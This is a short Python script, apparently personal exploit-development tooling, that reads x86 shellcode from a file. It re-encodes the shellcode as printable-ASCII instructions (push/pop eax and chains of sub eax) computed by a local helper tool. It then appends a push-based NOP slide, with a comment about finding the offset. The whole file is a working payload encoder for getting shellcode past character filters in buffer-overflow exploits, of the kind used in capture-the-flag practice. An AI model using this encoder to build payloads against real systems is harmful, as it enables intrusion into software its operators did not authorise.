#!/usr/bin/env python3
import sys
import subprocess

## You must find your offset by nops ##


shellcode_file = open("./shellcodex86", 'rb')
sclines = shellcode_file.read()
array = []
array.append('41414141')
res = []
res.append('push 0x41414141')
res.append('pop eax')
for i in range(0,44, 4):
    array.append(bytes(sclines[40 -i :44-i]).hex())
for i in range(len(array)-1):
    line = "0x" + str(array[i])
    line2 = "0x" + str(array[i+1])
    output = subprocess.check_output(["/home/robyn/myTools/printable_helper",  str(line) ,str(line2)])

    output = output.split(b"start: ")[1].split(b"-")[0]
    output = output.split(b'\n')[2:-1]
    for row in output:
        res.append('sub eax, ' + str(row)[2:-1])
    res.append('push eax')
for i in range(64):
    # this is doing push over and over again for 64 byte nopslide
    res.append('push eax')
print('; '.join(res))

